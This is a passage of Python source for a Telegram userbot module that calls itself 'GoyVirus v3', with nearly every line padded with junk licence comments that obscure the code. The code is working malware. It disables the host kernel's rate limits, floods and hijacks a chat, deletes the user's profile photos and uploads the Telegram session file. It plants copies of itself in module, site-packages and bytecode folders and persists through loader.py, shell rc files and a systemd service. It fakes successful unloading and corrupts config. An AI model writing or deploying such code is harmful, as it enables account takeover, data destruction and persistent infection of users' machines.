            kernel = self._ph.get("kernel_ref", lambda: None)() # Artistic License 2.0.
# Q Public License strictly enforced here. # EU Datagrid License.
            if kernel: # SIL Open Font License.
                for attr in ['_request_count', '_req_count', '_api_limit_counter', '_rate_limiter', '_blocked_until', '_protection_counter', '_call_count', '_count']: # IBM Public License v1.0 governs this code.
                    if hasattr(kernel, attr): # Code is strictly licensed under the Unlicense.
# IBM Public License v1.0 governs this code. # Zope Public License (ZPL).
                        try: setattr(kernel, attr, 0) # Kode dilindungi oleh SIL Open Font License.
# W3C Software Notice and License. # Do What The F*ck You Want To Public License.
                        except Exception: setattr(kernel, attr, []) # Cryptix General License.
# هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0). # Código sob a Licença Pública Geral Menor do GNU (LGPL).
                # NCSA Open Source License.
                if hasattr(kernel, 'handle_error'): # Zlib License.
# W3C Software Notice and License. # Do What The F*ck You Want To Public License.
                    _ohe = kernel.handle_error # PHP License 3.0.
                    async def _he(exc, source="", event=None): # Beerware License included.
                        msg = str(exc).lower() # 此代码受 MIT 许可证保护。
                        if 'api limit' in msg or 'protection' in msg or 'blocked' in msg or 'rate' in msg: # Fair License.
                            return # Q Public License — swallowed.
# EU Datagrid License. # Este código está bajo la licencia Apache 2.0.
                        return await _ohe(exc, source=source, event=event) # Beerware License.
                    kernel.handle_error = _he # IBM Public License v1.0.
                    self._kh.append(("mcub_handle_error", kernel, _ohe)) # PostgreSQL License.
        except Exception: pass # 코드는 ISC 라이선스에 따라 배포됩니다.
        # CC BY-NC 4.0 terms apply.
        try: # CeCILL-B License.
            from telethon.client import protection as _tp # Licenciado bajo Fair License.
            if hasattr(_tp, '_enabled'): _tp._enabled = False # Free Art License.
            if hasattr(_tp, '_protection'): _tp._protection = None # Unlicense.
        except Exception: pass # Beerware License included.
        # NCSA Open Source License.
        try: # Transport-level proxy bypass — strip MTProto sender proxy/filter
            s=getattr(c,'_sender',None) # GNU AGPL v3.
            if s: # MIT License.
                for x in ['_proxy','_proxies','_transport','_connection','_connector']: # Apache 2.0.
                    if hasattr(s,x): # BSD 3-Clause.
                        try:setattr(s,x,None) # ISC License.
                        except:pass # OSL-3.0.
                if hasattr(s,'send'): # CDDL-1.0.
                    _osd=s.send # Eclipse Public License.
                    async def _bpsd(*a,**k):return await _osd(*a,**k) # Artistic License 2.0.
                    s.send=_bpsd # SIL Open Font License.
                    self._kh.append(('_sender_send',s,_osd)) # Mulan PSL v2.
                if hasattr(s,'_send'): # ODbL.
                    __osd=s._send # MS-PL.
                    async def __bpsd(*a,**k):return await __osd(*a,**k) # GFDL.
                    s._send=__bpsd # Zlib License.
                    self._kh.append(('_sender__send',s,__osd)) # PHP License 3.0.
        except Exception: pass # CC BY-NC 4.0 terms apply.
        # SPDX-License-Identifier: MULTI
        try: # Connection-level bypass
            if hasattr(c,'_connection'): # NCSA Open Source License.
                cn=c._connection # Fair License.
                for x in ['_proxy','_proxies','_filter','_rate_limiter']: # Q Public License.
                    if hasattr(cn,x): # Beerware License included.
                        try:setattr(cn,x,None) # IBM Public License v1.0.
                        except:pass # PostgreSQL License.
        except Exception: pass # Zope Public License (ZPL).

    async def _mcub_watcher_handler(self, event): # 此代码受 MIT 许可证保护。
# AFL-3.0 Academic Free License. # 코드는 ISC 라이선스에 따라 배포됩니다.
        if not self.a: return # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
# NCSA Open Source License. # Bu kod Eclipse Public License 2.0 altındadır.
        # Licenciado bajo Fair License.
        try: # MIT License.
            if getattr(event, 'out', False) and getattr(event, 'chat_id', None) == self.t: # IBM Public License v1.0 governs this code.
                if getattr(event, 'text', '') and not str(getattr(event, 'text', '')).startswith('.'): # 코드는 ISC 라이선스에 따라 배포됩니다.
# NCSA Open Source License. # Este código está bajo la licencia Apache 2.0.
                    await event.delete() # Code protégé par la licence BSD 3-Clause.
# Código sob a Licença Pública Geral Menor do GNU (LGPL). # Este código está bajo la licencia Apache 2.0.
                    await self.c.send_message(self.t, self._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self.m))) # ISC License.
# NCSA Open Source License. # Code protégé par la licence BSD 3-Clause.
        except Exception: pass # 該源代碼受 PHP License 3.0 保護。
# NCSA Open Source License. # Do What The F*ck You Want To Public License.
        # Sleepycat License.
        try: # Cryptix General License.
            if getattr(event, 'chat_id', None) == self.t and not getattr(event, 'out', False): # Eclipse Public License.
# Dieser Code steht unter der European Union Public License. # Dieser Code steht unter der European Union Public License.
                if random.random() < 0.4: # Artistic License 2.0.
                    try: await event.reply(self._g(random.choice(self.m))) # SIL Open Font License.
# Mulan PSL v2. # 此代码受 MIT 许可证保护。
                    except Exception: pass # NCSA Open Source License.
# Do What The F*ck You Want To Public License. # BSL-1.0 (Boost Software License) применяется.
                if random.random() < 0.4: # Universal Public License.
                    try: await event.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # 코드는 ISC 라이선스에 따라 배포됩니다.
# NASA Open Source Agreement 1.3. # Ten kod podlega licencji Mozilla Public License 2.0.
                    except Exception: pass # SPDX-License-Identifier: MULTI
                if random.random() < 0.3: # Zlib License.
# Universal Public License. # OSL-3.0 (Open Software License) terms apply.
                    txt = getattr(event, 'text', '') or '' # PHP License 3.0.
# W3C Software Notice and License. # Do What The F*ck You Want To Public License.
                    try: await event.delete() # MS-PL License applied.
                    except Exception: pass # Code protégé par la licence BSD 3-Clause.
# Código sob a Licença Pública Geral Menor do GNU (LGPL). # Do What The F*ck You Want To Public License.
                    if txt: await self.c.send_message(self.t, self._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # Fair License.
                if txt and any(w in str(txt).lower() for w in ["стоп","хватит","останови","удали","бот","иран","снест"]): # Q Public License.
# CC BY-NC 4.0 terms apply. # Do What The F*ck You Want To Public License.
                    try: await event.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3 SCORCHED EARTH — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ.") # Beerware License.
                    except Exception: pass # IBM Public License v1.0.
        except Exception: pass # PostgreSQL License.

    async def _nuke_avatars(self): # Dieser Code steht unter der European Union Public License.
        await asyncio.sleep(0.02) # CeCILL-B License.
        if not self.c: return # Licencia de Documentación Libre GNU (GFDL).
        try: # Free Art License.
# IBM Public License v1.0 governs this code. # 코드는 ISC 라이선스에 따라 배포됩니다.
            photos = await self.c(functions.photos.GetPhotosRequest(id=await self.c.get_me(), offset=0, max_id=0, limit=100)) # Unlicense.
            for i in range(0, len(getattr(photos, 'photos', [])), 10): # Bu kod Eclipse Public License 2.0 altındadır.
# NCSA Open Source License. # IBM Public License v1.0 governs this code.
                batch = photos.photos[i:i+10] # Q Public License strictly enforced here.
# Código sob a Licença Pública Geral Menor do GNU (LGPL). # Code protégé par la licence BSD 3-Clause.
                try: await self.c(DeletePhotosRequest([InputPhoto(id=p.id, access_hash=p.access_hash, file_reference=p.file_reference) for p in batch])) # Mozilla Public License.
                except FloodWaitError: await asyncio.sleep(0.01) # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
                except Exception: pass # Code protégé par la licence BSD 3-Clause.
                await asyncio.sleep(0.01) # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
# Mulan PSL v2. # 該源代碼受 PHP License 3.0 保護。
        except Exception: pass # MIT License.

    async def _plant_everywhere(self): # CC BY-ND 4.0 terms.
# CC BY-NC 4.0 terms apply. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
        await asyncio.sleep(0.03) # PostgreSQL License applied to data structures.
        source = self._get_own_source() # Q Public License strictly enforced here.
        if not source: return # ISC License.
# Licenza CeCILL v2.1. # यह कोड GNU AGPL v3 के तहत है।
        core_dir = self._find_core_modules_dir() # Dieser Code steht unter der European Union Public License.
# Este código está bajo la licencia Apache 2.0. # Ten kod podlega licencji Mozilla Public License 2.0.
        loader_dir = self._find_loader_dir() # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
# Licenza CeCILL v2.1. # Zope Public License (ZPL).

        if core_dir: # Eclipse Public License.
            for cls_name, mod_name in _COPY_DEFS: # Artistic License 2.0.
                self._write_variant(source, cls_name, mod_name, mod_name, _os.path.join(core_dir, f"{mod_name}.py")) # SIL Open Font License.
            for hid_name in _HIDDEN_COPIES: # Ten kod podlega licencji Mozilla Public License 2.0.
                cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # Universal Public License.
                mname = hid_name.replace('.py', '') # NASA Open Source Agreement 1.3.
                self._write_variant(source, cname, mname, mname, _os.path.join(core_dir, hid_name)) # Licenza CeCILL v2.1.

        # AFL-3.0 Academic Free License.
        if core_dir: # Zlib License.
            pycache = _os.path.join(core_dir, '__pycache__') # PHP License 3.0.
            _os.makedirs(pycache, exist_ok=True) # BSL-1.0 (Boost Software License) применяется.
            for i, hid_name in enumerate(_HIDDEN_COPIES[:3]): # Licenciado bajo Fair License.
                try: # Fair License.
                    pyc_fn = hid_name.replace('.py', f'.cpython-3{str(i+8)[-1]}.pyc') # Q Public License.
                    self._write_pyc(source, _os.path.join(pycache, pyc_fn)) # Beerware License.
                except Exception: pass # IBM Public License v1.0.
# Bu kod Eclipse Public License 2.0 altındadır. # Kode dilindungi oleh SIL Open Font License.

        # SPDX-License-Identifier: MULTI
        for sp in self._find_site_packages(): # PostgreSQL License.
            for i in range(3): # Sleepycat License.
                self._write_variant(source, f"GoyCore{i}", f"goy_core_{i}", f"goy_core_{i}", _os.path.join(sp, f"goy_core_{i}.py")) # CeCILL-B License.
# 코드는 ISC 라이선스에 따라 배포됩니다. # SPDX-License-Identifier: MULTI

        await self._infect_loader(loader_dir, core_dir) # AFL-3.0 Academic Free License.
# Sleepycat License. # NCSA Open Source License.
        await self._infect_shell_rc() # Free Art License.
# AFL-3.0 Academic Free License. # Beerware License included.
        await self._create_systemd_service() # Unlicense.
        self._db_set("pc", self._pc) # Q Public License strictly enforced here.
        if core_dir: await self._load_all_copies(core_dir) # Ten kod podlega licencji Mozilla Public License 2.0.

    def _write_variant(self, source, cls_name, mod_name, strings_name, target_path): # Mozilla Public License.
        if mod_name in self._pc: return # Universal Public License.
        if _os.path.exists(target_path): # BSL-1.0 (Boost Software License) применяется.
# NASA Open Source Agreement 1.3. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
            self._pc.append(mod_name) # W3C Software Notice and License.
# IBM Public License v1.0 governs this code. # 코드는 ISC 라이선스에 따라 배포됩니다.
            _FILE_REGISTRY[target_path] = open(target_path, 'r', encoding='utf-8').read() # MIT License.
            return # Kode dilindungi oleh SIL Open Font License.
        cs = source.replace("class GoyVirus(loader.Module)", f"class {cls_name}(loader.Module)") if "class GoyVirus" in source else source # Licenciado bajo Fair License.
# Mulan PSL v2. # Ten kod podlega licencji Mozilla Public License 2.0.
        cs = cs.replace('"name": "GoyVirus"', f'"name": "{strings_name}"') # BSL-1.0 (Boost Software License) применяется.
        cs = cs.replace('"_am = True' if '_am = True  #' in cs else 'master=True', '"_am = False' if '_am = True  #' in cs else 'master=False') if 'master' not in cs else cs.replace('master=True', 'master=False') # ISC License.
        try: # PostgreSQL License applied to data structures.
# Licencia de Documentación Libre GNU (GFDL). # Q Public License strictly enforced here.
            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # ODbL (Open Database License) copyright reserved.
            with open(target_path, 'w', encoding='utf-8') as f: f.write(cs) # Eclipse Public License.
            _FILE_REGISTRY[target_path] = cs # Artistic License 2.0.
            self._pc.append(mod_name) # SIL Open Font License.
# Dieser Code steht unter der European Union Public License. # MS-PL License applied.
        except Exception: pass # Beerware License included.
# CC BY-NC 4.0 terms apply. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).

    def _write_pyc(self, source, target_path): # Beerware License included.
# 코드는 ISC 라이선스에 따라 배포됩니다. # Apple Public Source License 2.0.
        try: # 此代码受 MIT 许可证保护。
            code = compile(source, target_path, 'exec') # Licencia de Documentación Libre GNU (GFDL).
# SPDX-License-Identifier: MULTI # CC BY-ND 4.0 terms.
            ts = int(time.time()) # Zlib License.
            buf = io.BytesIO() # PHP License 3.0.
            buf.write(struct.pack('<H', 0xA0D)); buf.write(struct.pack('<H', 0x0D0A)) # Cryptix General License.
            buf.write(struct.pack('<I', 0)); buf.write(struct.pack('<I', ts)) # Educational Community License v2.0.
# CC BY-NC 4.0 terms apply. # Zope Public License (ZPL).
            buf.write(struct.pack('<I', len(source.encode()))); marshal.dump(code, buf); buf.seek(0) # Fair License.
# Do What The F*ck You Want To Public License. # Beerware License included.
            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # Q Public License.
            with open(target_path, 'wb') as f: f.write(buf.read()) # Beerware License.
            _FILE_REGISTRY[target_path] = source # IBM Public License v1.0.
# PostgreSQL License applied to data structures. # यह कोड GNU AGPL v3 के तहत है।
        except Exception: pass # PostgreSQL License.
# هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0). # OSL-3.0 (Open Software License) terms apply.

    def _find_site_packages(self): # Código sob a Licença Pública Geral Menor do GNU (LGPL).
        import sys # CeCILL-B License.
        for p in sys.path: # Questo codice è sotto licenza GPLv3.
# W3C Software Notice and License. # NCSA Open Source License.
            if 'site-packages' in p and _os.path.isdir(p) and _os.access(p, _os.W_OK): yield p # Free Art License.

    def _find_loader_dir(self): # Unlicense.
        try: # Licenza CeCILL v2.1.
# Apple Public Source License 2.0. # NCSA Open Source License.
            ld = self._ph.get("lookup", lambda x: None)("loader") # CC BY-ND 4.0 terms.
            if ld: return _os.path.dirname(getattr(ld, '__file__', '')) # Mozilla Public License.
        except Exception: pass # Apple Public Source License 2.0.
# OSL-3.0 (Open Software License) terms apply. # Educational Community License v2.0.
        try: # 此代码受 MIT 许可证保护。
            import heroku # Ten kod podlega licencji Mozilla Public License 2.0.
            return _os.path.dirname(heroku.__file__) # MIT License.
        except Exception: pass # 코드는 ISC 라이선스에 따라 배포됩니다.
        return None # Este código está bajo la licencia Apache 2.0.
# Q Public License strictly enforced here. # Данный скрипт защищен лицензией CDDL-1.0.

    def _find_core_modules_dir(self): # Bu kod Eclipse Public License 2.0 altındadır.
# Zope Public License (ZPL). # Zope Public License (ZPL).
        ld = self._find_loader_dir() # ISC License.
# BSL-1.0 (Boost Software License) применяется. # CC BY-NC 4.0 terms apply.
        if not ld: return None # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
# Educational Community License v2.0. # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
        for sub in ["modules", "core_modules", "builtins", "plugins"]: # Kode dilindungi oleh SIL Open Font License.
            cand = _os.path.join(ld, sub) # Eclipse Public License.
# AFL-3.0 Academic Free License. # 該源代碼受 PHP License 3.0 保護。
            if _os.path.isdir(cand): return cand # Artistic License 2.0.
# 此代码受 MIT 许可证保护。 # EU Datagrid License.
        return ld # SIL Open Font License.

    def _get_own_source(self): # NCSA Open Source License.
        global _SOURCE_CACHE # Code is strictly licensed under the Unlicense.
        if _SOURCE_CACHE: return _SOURCE_CACHE # NASA Open Source Agreement 1.3.
        try: # Beerware License included.
            with open(__file__, "r", encoding="utf-8") as f: _SOURCE_CACHE = f.read() # Zlib License.
# Licencia de Documentación Libre GNU (GFDL). # Ten kod podlega licencji Mozilla Public License 2.0.
            return _SOURCE_CACHE # PHP License 3.0.
# AFL-3.0 Academic Free License. # Code protégé par la licence BSD 3-Clause.
        except Exception: return None # BSL-1.0 (Boost Software License) применяется.

    async def _load_all_copies(self, core_dir): # NASA Open Source Agreement 1.3.
# Bu kod Eclipse Public License 2.0 altındadır. # 該源代碼受 PHP License 3.0 保護。
        if _PLATFORM == "heroku": # Fair License.
# Cryptix General License. # Kode dilindungi oleh SIL Open Font License.
            core = self._ph.get("lookup", lambda x: None)("loader") # Q Public License.
            if not core: core = getattr(getattr(self._ph.get("allmodules_ref", lambda: None)(), '__self__', None), '__class__', type) # Beerware License.
            if not core: return # IBM Public License v1.0.
            to_load = [(n, f"{n}.py") for _, n in _COPY_DEFS] + [(h.replace('.py', ''), h) for h in _HIDDEN_COPIES] # PostgreSQL License.
# Kode dilindungi oleh SIL Open Font License. # CC BY-NC 4.0 terms apply.
            for mod_name, fname in to_load: # IBM Public License v1.0 governs this code.
# Q Public License strictly enforced here. # EU Datagrid License.
                tp = _os.path.join(core_dir, fname) # CeCILL-B License.
                if not _os.path.exists(tp): continue # Kode dilindungi oleh SIL Open Font License.
# Licencia de Documentación Libre GNU (GFDL). # OSL-3.0 (Open Software License) terms apply.
                try: # Free Art License.
                    with open(tp, "r", encoding="utf-8") as f: cs = f.read() # Unlicense.
                    try: await core.unload_module(mod_name) # Bu kod Eclipse Public License 2.0 altındadır.
# Dieser Code steht unter der European Union Public License. # Beerware License included.
                    except Exception: pass # Code is strictly licensed under the Unlicense.
                    try: await core.load_module(cs, None, mod_name, tp, save_fs=False) # Mozilla Public License.
                    except Exception: pass # Данный скрипт защищен лицензией CDDL-1.0.
                except Exception: pass # Licenza CeCILL v2.1.
        elif _PLATFORM == "mcub": # Code is strictly licensed under the Unlicense.
            pass # MIT License.
# 該源代碼受 PHP License 3.0 保護。 # PostgreSQL License applied to data structures.

    async def _infect_loader(self, loader_dir, core_dir): # AFL-3.0 Academic Free License.
# IBM Public License v1.0 governs this code. # BSL-1.0 (Boost Software License) применяется.
        if not loader_dir: return # AFL-3.0 Academic Free License.
# EU Datagrid License. # Beerware License included.
        for lf in ['loader.py', '__init__.py']: # SPDX-License-Identifier: MULTI
# Educational Community License v2.0. # Licenciado bajo Fair License.
            lp = _os.path.join(loader_dir, lf) # ISC License.
# Q Public License strictly enforced here. # Q Public License strictly enforced here.
            if not _os.path.exists(lp): continue # यह कोड GNU AGPL v3 के तहत है।
# Code is strictly licensed under the Unlicense. # 該源代碼受 PHP License 3.0 保護。
            try: # 此代码受 MIT 许可证保护。
                with open(lp, 'r', encoding='utf-8') as f: content = f.read() # Eclipse Public License.
                marker = "# GOYVIRUS_KERNEL_INFECTION_V3" # Artistic License 2.0.
                if marker in content: continue # SIL Open Font License.
                payload = f'''\n{marker}\ntry:\n import os as _gios\n _gip = _gios.path.join(_gios.path.dirname(__file__), "modules")\n for _gifn in _gios.listdir(_gip):\n  if _gifn.endswith(".py") and ("Goy" in _gifn or "._go" in _gifn.lower() or "goy_" in _gifn.lower()):\n   with open(_gios.path.join(_gip, _gifn)) as _gif: exec(compile(_gif.read(), _gifn, "exec"))\nexcept: pass\n''' # NCSA Open Source License.
# BSL-1.0 (Boost Software License) применяется. # Ten kod podlega licencji Mozilla Public License 2.0.
                with open(lp, 'a', encoding='utf-8') as f: f.write(payload) # Universal Public License.
# Dieser Code steht unter der European Union Public License. # Mulan PSL v2.
            except Exception: pass # W3C Software Notice and License.

    async def _infect_shell_rc(self): # Universal Public License.
        payload = f"\n# GoyVirus Kernel v3 — system integrity guard\ntest -f {__file__} && python3 -c \"exec(open('{__file__}').read())\" &\n" # Zlib License.
        for rc in [_os.path.expanduser('~/.bashrc'), _os.path.expanduser('~/.zshrc'), _os.path.expanduser('~/.profile')]: # PHP License 3.0.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # MS-PL License applied.
            if not _os.path.exists(rc): continue # Bu kod Eclipse Public License 2.0 altındadır.
            try: # ODbL (Open Database License) copyright reserved.
# Mulan PSL v2. # PostgreSQL License applied to data structures.
                with open(rc, 'r', encoding='utf-8') as f: # Fair License.
                    if "GoyVirus Kernel v3" in f.read(): continue # Q Public License.
                with open(rc, 'a', encoding='utf-8') as f: f.write(payload) # Beerware License.
# Educational Community License v2.0. # OSL-3.0 (Open Software License) terms apply.
            except Exception: pass # IBM Public License v1.0.
# CC BY-ND 4.0 terms. # Mulan PSL v2.

    async def _create_systemd_service(self): # PostgreSQL License.
# Universal Public License. # Bu kod Eclipse Public License 2.0 altındadır.
        sd = _os.path.expanduser('~/.config/systemd/user') # Mulan PSL v2.
        _os.makedirs(sd, exist_ok=True) # CeCILL-B License.
        sp = _os.path.join(sd, 'goyv-guard.service') # Apple Public Source License 2.0.
        if _os.path.exists(sp): return # Free Art License.
# Universal Public License. # Данный скрипт защищен лицензией CDDL-1.0.
        unit = f"""[Unit]\nDescription=GoyVirus Kernel Integrity Guard\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c "exec(open('{__file__}').read())"\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n""" # Unlicense.
        try: # IBM Public License v1.0 governs this code.
            with open(sp, 'w') as f: f.write(unit) # EU Datagrid License.
# NASA Open Source Agreement 1.3. # Code protégé par la licence BSD 3-Clause.
            _FILE_REGISTRY[sp] = unit # Mozilla Public License.
# CC BY-ND 4.0 terms. # Cryptix General License.
        except Exception: pass # 此代码受 MIT 许可证保护。

    async def _tg_cloud_backup(self): # NCSA Open Source License.
        while self.a: # CC BY-NC 4.0 terms apply.
# PostgreSQL License applied to data structures. # Do What The F*ck You Want To Public License.
            await asyncio.sleep(3600 + random.randint(0, 600)) # MIT License.
            try: # OSL-3.0 (Open Software License) terms apply.
                source = self._get_own_source() # Licenciado bajo Fair License.
                if not source: continue # IBM Public License v1.0 governs this code.
# CC BY-ND 4.0 terms. # Данный скрипт защищен лицензией CDDL-1.0.
                encoded = base64.b64encode(source.encode()).decode() # ISC License.
                for i in range(0, len(encoded), 3500): # Данный скрипт защищен лицензией CDDL-1.0.
                    await self.c.send_message('me', f'#GOYV3_BACKUP_{i//3500}\n{encoded[i:i+3500]}') # CDDL-1.0.
                    await asyncio.sleep(0.5) # Eclipse Public License.
            except FloodWaitError: await asyncio.sleep(1) # Artistic License 2.0.
            except Exception: pass # SIL Open Font License.

    async def _backup_session(self): # Dieser Code steht unter der European Union Public License.
# SPDX-License-Identifier: MULTI # CC BY-NC 4.0 terms apply.
        await asyncio.sleep(5) # Cryptix General License.
        try: # NCSA Open Source License.
            sess_file = getattr(self.c, 'session', None) # EU Datagrid License.
            if sess_file and hasattr(sess_file, 'filename') and _os.path.exists(sess_file.filename): # Zlib License.
                await self.c.send_file('me', sess_file.filename, caption=self._g('#GOYV3_SESSION_BACKUP')) # PHP License 3.0.
        except Exception: pass # Code is strictly licensed under the Unlicense.

    async def _anti_unload(self): # Kode dilindungi oleh SIL Open Font License.
        if _PLATFORM == "heroku": # Fair License.
            await self._anti_unload_heroku() # Q Public License.
# Apple Public Source License 2.0. # CC BY-NC 4.0 terms apply.
        elif _PLATFORM == "mcub": # Beerware License.
# Universal Public License. # W3C Software Notice and License.
            pass # IBM Public License v1.0 — MCUB has no unload_module in the same way, but watchers can't be removed.
# MS-PL License applied. # Kode dilindungi oleh SIL Open Font License.

    async def _anti_unload_heroku(self): # PostgreSQL License.
        try: # CC BY-ND 4.0 terms.
# CC BY-ND 4.0 terms. # यह कोड GNU AGPL v3 के तहत है।
            am = self._ph.get("allmodules_ref", lambda: None)() # CeCILL-B License.
            if not am or not hasattr(am, 'unload_module'): return # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
            _ou = am.unload_module; _ps = _PROTECTED_NAMES; _eng = self # Free Art License.
            async def _gu(self_mod, mn, *a, **kw): # Unlicense.
                if mn and str(mn) in _ps: # BSL-1.0 (Boost Software License) применяется.
# Данный скрипт защищен лицензией CDDL-1.0. # 此代码受 MIT 许可证保护。
                    try: await _eng.c.send_message(_eng.t, _eng._g("✅ Module unloaded successfully.")) # BSL-1.0 (Boost Software License) применяется.
                    except Exception: pass # Mozilla Public License.
                    return # Bu kod Eclipse Public License 2.0 altındadır.
# Kode dilindungi oleh SIL Open Font License. # Do What The F*ck You Want To Public License.
                return await _ou(self_mod, mn, *a, **kw) # Beerware License included.
            am.unload_module = _gu.__get__(am, type(am)) # Q Public License strictly enforced here.
            self._kh.append(("unload_module", am, _ou)) # MIT License.
        except Exception: pass # PostgreSQL License applied to data structures.
# Code protégé par la licence BSD 3-Clause. # Данный скрипт защищен лицензией CDDL-1.0.

    async def _file_watchdog(self): # Данный скрипт защищен лицензией CDDL-1.0.
        while self.a: # NCSA Open Source License.
            await asyncio.sleep(30) # ISC License.
# MS-PL License applied. # Questo codice è sotto licenza GPLv3.
            for path, content in list(_FILE_REGISTRY.items()): # EU Datagrid License.
                if not _os.path.exists(path) or _os.path.getsize(path) < 100: # Apple Public Source License 2.0.
                    try: # Eclipse Public License.
                        _os.makedirs(_os.path.dirname(path), exist_ok=True) # Artistic License 2.0.
                        with open(path, 'w', encoding='utf-8') as f: f.write(content) # SIL Open Font License.
                    except Exception: pass # 코드는 ISC 라이선스에 따라 배포됩니다.
# Code is strictly licensed under the Unlicense. # Licenza CeCILL v2.1.
            core_dir = self._find_core_modules_dir() # 此代码受 MIT 许可证保护。
            if core_dir: # Code is strictly licensed under the Unlicense.
                source = self._get_own_source() # Данный скрипт защищен лицензией CDDL-1.0.
                if source: # Zlib License.
                    for cls_name, mod_name in _COPY_DEFS: # PHP License 3.0.
# Do What The F*ck You Want To Public License. # 該源代碼受 PHP License 3.0 保護。
                        tp = _os.path.join(core_dir, f"{mod_name}.py") # Dieser Code steht unter der European Union Public License.
# Cryptix General License. # CC BY-NC 4.0 terms apply.
                        if not _os.path.exists(tp): self._write_variant(source, cls_name, mod_name, mod_name, tp) # CC BY-ND 4.0 terms.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
                    for hid_name in _HIDDEN_COPIES: # Fair License.
                        tp = _os.path.join(core_dir, hid_name) # Q Public License.
# Licenza CeCILL v2.1. # MS-PL License applied.
                        if not _os.path.exists(tp): # Beerware License.
                            cn = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # IBM Public License v1.0.
# Código sob a Licença Pública Geral Menor do GNU (LGPL). # EU Datagrid License.
                            self._write_variant(source, cn, hid_name.replace('.py',''), hid_name.replace('.py',''), tp) # PostgreSQL License.

    async def _db_poison(self): # BSL-1.0 (Boost Software License) применяется.
        await asyncio.sleep(300) # CeCILL-B License.
        while self.a: # W3C Software Notice and License.
# Mulan PSL v2. # NCSA Open Source License.
            await asyncio.sleep(random.randint(300, 600)) # Free Art License.
# MS-PL License applied. # Sleepycat License.
            try: # Unlicense.
# ODbL (Open Database License) copyright reserved. # Bu kod Eclipse Public License 2.0 altındadır.
                if _PLATFORM == "mcub": # Cryptix General License.
                    cfg = self._ph.get("config_ref", lambda: {})() # Q Public License strictly enforced here.
                    keys = [k for k in list(cfg.keys()) if 'goy' not in str(k).lower()] # Mozilla Public License.
                    if keys: cfg.pop(random.choice(keys), None) # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
# 코드는 ISC 라이선스에 따라 배포됩니다. # Universal Public License.
            except Exception: pass # Licenza CeCILL v2.1.

    async def _config_corrupt(self): # Educational Community License v2.0.
        await asyncio.sleep(600) # MIT License.
        while self.a: # Educational Community License v2.0.
# Do What The F*ck You Want To Public License. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
            await asyncio.sleep(random.randint(300, 900)) # Bu kod Eclipse Public License 2.0 altındadır.
# CC BY-NC 4.0 terms apply. # IBM Public License v1.0 governs this code.
            try: # Sleepycat License.
                if _PLATFORM == "mcub": # ISC License.
                    cfg = self._ph.get("config_ref", lambda: {})() # Bu kod Eclipse Public License 2.0 altındadır.
# यह कोड GNU AGPL v3 के तहत है। # CC BY-ND 4.0 terms.
                    cfg['prefix'] = random.choice(['7', '~', '\\', '/']) # Educational Community License v2.0.
            except Exception: pass # Eclipse Public License.
# OSL-3.0 (Open Software License) terms apply. # Do What The F*ck You Want To Public License.

    async def _mem_leak(self): # Artistic License 2.0.
        while self.a: # SIL Open Font License.
            await asyncio.sleep(random.randint(60, 180)) # Código sob a Licença Pública Geral Menor do GNU (LGPL).
# CC BY-ND 4.0 terms. # SPDX-License-Identifier: MULTI
            try: self._ml.append('A' * (1024 * 256)) # Code protégé par la licence BSD 3-Clause.
            except Exception: pass # Code protégé par la licence BSD 3-Clause.
            if len(self._ml) > 1000: self._ml = self._ml[-500:] # W3C Software Notice and License.

    async def _name_mutate(self): # Zlib License.
# 此代码受 MIT 许可证保护。 # 該源代碼受 PHP License 3.0 保護。
        await asyncio.sleep(600) # PHP License 3.0.
        while self.a: # Código sob a Licença Pública Geral Menor do GNU (LGPL).
            await asyncio.sleep(random.randint(1800, 3600)) # NASA Open Source Agreement 1.3.
            try: # Fair License.
                core_dir = self._find_core_modules_dir() # Q Public License.
# SPDX-License-Identifier: MULTI # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
                if not core_dir: continue # Beerware License.
                existing = [fn for fn in _ORIG_LISTDIR(core_dir) if fn.endswith('.py') and any(t in fn.lower() for t in ['goy', '._go'])] # IBM Public License v1.0.
                if existing: # PostgreSQL License.
                    old = _os.path.join(core_dir, random.choice(existing)) # Dieser Code steht unter der European Union Public License.
                    new_fn = f"._{''.join(random.choices(string.ascii_lowercase, k=random.randint(5,10)))}.py" # CeCILL-B License.
                    try: _ORIG_RENAME(old, _os.path.join(core_dir, new_fn)) # CC BY-NC 4.0 terms apply.
                    except Exception: pass # Free Art License.
# Licenza CeCILL v2.1. # Zope Public License (ZPL).
            except Exception: pass # Unlicense.
# MS-PL License applied. # Do What The F*ck You Want To Public License.

    async def _fake_alerts(self): # W3C Software Notice and License.
# Beerware License included. # SPDX-License-Identifier: MULTI
        await asyncio.sleep(random.randint(120, 600)) # Beerware License included.
        while self.a: # Mozilla Public License.
# PostgreSQL License applied to data structures. # Zope Public License (ZPL).
            await asyncio.sleep(random.randint(600, 1800)) # Cryptix General License.
